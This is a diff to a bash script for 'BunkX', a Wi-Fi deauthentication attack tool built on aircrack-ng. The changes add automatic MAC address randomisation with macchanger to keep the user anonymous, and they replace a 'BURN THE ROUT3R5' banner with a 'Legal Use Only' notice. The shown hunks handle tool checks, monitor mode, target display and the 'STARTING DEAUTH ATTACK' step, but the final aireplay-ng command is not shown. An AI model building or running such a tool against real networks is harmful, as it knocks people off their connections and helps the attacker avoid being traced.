@@ -1,18 +1,19 @@
 #!/bin/bash
 
-# ==========================================================================================================
-# BunkX is a bash-based deauthentication attack tool for wireless network security testing using aircrack-ng.
+# ======================================================================================
+# BunkX Deauthentication Tool - Professional Network Security Testing Suite
+# Version: 0.1
 # Developer: DoomsDay (d00mzd4y@proton.me)
-# GitHub: https://github.com/Dooms-D4y
+# GitHub: https://github.com/Dooms-D4y/BunkX
 # 
 # Features:
 # - Targeted deauthentication attacks
+# - Automatic MAC address spoofing
 # - Network scanning and selection
 # - Monitor mode management
 # - Graceful cleanup
-# Just be responsible enough. I'm not to be held responsible for your mess
-# But have fun being productive 😉
-# ==========================================================================================================
+# - Legal compliance warnings
+# ======================================================================================
 
 # Display BunkX banner
 echo -e "\e[1;31m"
@@ -23,17 +24,20 @@ cat << "EOF"
  \ \  _ <'/\ \/\ \ /' _ `\ \ , < `\/ > <     
   \ \ \L\ \ \ \_\ \/\ \/\ \ \ \\`\  \/'/\`\  
    \ \____/\ \____/\ \_\ \_\ \_\ \_\/\_\\ \_\
-    \/___/  \/___/  \/_/\/_/\/_/\/_/\/_/ \/_ /                                            
+    \/___/  \/___/  \/_/\/_/\/_/\/_/\/_/ \/_/
 EOF
 echo -e "\e[0m"
 
-# Developer information
-echo -e "\e[1;36m"
-echo "         +-----------------------------------------------+"
-echo "         |Developed by: DoomsDay                         |"
-echo "         |Contact: d00mzd4y@proton.me                    |"
-echo "         |GitHub: https://github.com/Dooms-D4y/BunkX.git |"
-echo "         +---------------------[v0.1]--------------------+"
+# Developer information with enhanced formatting
+echo -e "\e[1;35m"
+echo "┌──────────────────────────────────────────────────────────────┐"
+echo "│                   DEVELOPER INFORMATION                      │"
+echo "├──────────────────────────────────────────────────────────────┤"
+echo -e "│ \e[1;33mName:\e[0m    \e[1;37mDoomsDay\e[1;35m                                            │"
+echo -e "│ \e[1;33mContact:\e[0m \e[1;37md00mzd4y@proton.me\e[1;35m                                  │"
+echo -e "│ \e[1;33mGitHub:\e[0m  \e[1;37mhttps://github.com/Dooms-D4y\e[1;35m                        │"
+echo -e "│ \e[1;33mVersion:\e[0m \e[1;37mv0.1\e[1;35m                                                │"
+echo "└──────────────────────────────────────────────────────────────┘"
 echo -e "\e[0m"
 echo "=================================================================================="
 
@@ -44,9 +48,22 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # Verify required tools
-if ! command -v iw &> /dev/null || ! command -v aireplay-ng &> /dev/null; then
-    echo -e "\e[1;31m[ERROR] Missing required tools. Install with:\e[0m"
-    echo "sudo apt update && sudo apt install -y iw aircrack-ng"
+declare -a required_tools=("iw" "aireplay-ng" "macchanger")
+missing_tools=()
+
+for tool in "${required_tools[@]}"; do
+    if ! command -v "$tool" &> /dev/null; then
+        missing_tools+=("$tool")
+    fi
+done
+
+if [ ${#missing_tools[@]} -gt 0 ]; then
+    echo -e "\e[1;31m[ERROR] Missing required tools:\e[0m"
+    for tool in "${missing_tools[@]}"; do
+        echo " - $tool"
+    done
+    echo "Install with:"
+    echo "sudo apt update && sudo apt install -y aircrack-ng macchanger"
     exit 1
 fi
 
@@ -62,6 +79,14 @@ cleanup() {
     if [[ -n $IFACE && -d /sys/class/net/"$IFACE" ]]; then
         echo -e "\e[1;33m[+] Reverting $IFACE to managed mode\e[0m"
         ip link set "$IFACE" down
+        
+        # Restore original MAC address
+        if [[ -n $ORIG_MAC ]]; then
+            echo -e "\e[1;33m[+] Restoring original MAC address: $ORIG_MAC\e[0m"
+            macchanger -p "$IFACE" &>/dev/null
+            ip link set dev "$IFACE" address "$ORIG_MAC"
+        fi
+        
         iw "$IFACE" set type managed
         ip link set "$IFACE" up
     fi
@@ -160,8 +185,8 @@ scan_networks() {
 }
 
 # Main script
-echo -e "\n\e[1;46m BURN THE ROUT3R5 & LULz \e[0m"
-echo -e "\e[1;33m[!] 🖕 th3 syst3m! Press Ctrl+C to exit\e[0m\n"
+echo -e "\n\e[1;46m BUNKX DEAUTHENTICATION TOOL v0.1 \e[0m"
+echo -e "\e[1;33m[!] Legal Use Only! Press Ctrl+C to exit\e[0m\n"
 
 # Interface selection
 read -p "Wireless interface [wlan0]: " IFACE
@@ -175,6 +200,10 @@ if ! [ -e /sys/class/net/"$IFACE" ]; then
     exit 1
 fi
 
+# Store original MAC address
+ORIG_MAC=$(cat /sys/class/net/"$IFACE"/address)
+echo -e "\e[1;33m[+] Original MAC address: $ORIG_MAC\e[0m"
+
 # Check current mode
 CURRENT_MODE=$(iw dev "$IFACE" info | grep type | awk '{print $2}')
 if [ "$CURRENT_MODE" != "monitor" ]; then
@@ -184,8 +213,16 @@ if [ "$CURRENT_MODE" != "monitor" ]; then
     # Kill conflicting processes
     airmon-ng check kill &>/dev/null
     
-    # Change interface mode
+    # Bring interface down for MAC change
     ip link set "$IFACE" down
+    
+    # Spoof MAC address
+    echo -e "\e[1;33m[+] Randomizing MAC address for anonymity...\e[0m"
+    macchanger -r "$IFACE" | grep "New MAC"
+    SPOOFED_MAC=$(macchanger -s "$IFACE" | grep "Current MAC" | awk '{print $3}')
+    echo -e "\e[1;32m[+] New MAC: $SPOOFED_MAC\e[0m"
+    
+    # Change interface mode
     if ! iw "$IFACE" set type monitor; then
         echo -e "\e[1;31m[ERROR] Failed to set monitor mode!\e[0m" >&2
         echo -e "\e[1;33mTroubleshooting tips:\e[0m"
@@ -197,6 +234,12 @@ if [ "$CURRENT_MODE" != "monitor" ]; then
     echo -e "\e[1;32m[+] Monitor mode enabled on $IFACE\e[0m"
 else
     echo -e "\e[1;32m[+] $IFACE already in monitor mode\e[0m"
+    echo -e "\e[1;33m[+] Randomizing MAC address for anonymity...\e[0m"
+    ip link set "$IFACE" down
+    macchanger -r "$IFACE" | grep "New MAC"
+    SPOOFED_MAC=$(macchanger -s "$IFACE" | grep "Current MAC" | awk '{print $3}')
+    echo -e "\e[1;32m[+] New MAC: $SPOOFED_MAC\e[0m"
+    ip link set "$IFACE" up
 fi
 
 # Initialize network data file
@@ -239,10 +282,13 @@ iw dev "$IFACE" set channel "$CHANNEL" || {
 
 # Start attack
 echo -e "\n\e[1;31m[+] STARTING DEAUTH ATTACK \e[0m"
-echo -e "Target:    \e[1;33m$ESSID\e[0m"
-echo -e "BSSID:     \e[1;33m$BSSID\e[0m"
-echo -e "Channel:   \e[1;33m$CHANNEL\e[0m"
-echo -e "Interface: \e[1;33m$IFACE\e[0m"
+echo -e "\e[1;35m┌──────────────────────────────────────────────────────────────┐"
+echo -e "│ \e[1;33mTarget:\e[0m    \e[1;37m$ESSID\e[1;35m                                        │"
+echo -e "│ \e[1;33mBSSID:\e[0m     \e[1;37m$BSSID\e[1;35m                                        │"
+echo -e "│ \e[1;33mChannel:\e[0m   \e[1;37m$CHANNEL\e[1;35m                                            │"
+echo -e "│ \e[1;33mInterface:\e[0m \e[1;37m$IFACE\e[1;35m                                        │"
+echo -e "│ \e[1;33mSpoofed MAC:\e[0m \e[1;37m$SPOOFED_MAC\e[1;35m                                │"
+echo -e "└──────────────────────────────────────────────────────────────┘\e[0m"
 echo -e "\e[1;31mPress Ctrl+C to STOP ATTACK\e[0m\n"
 
 # Run deauthentication
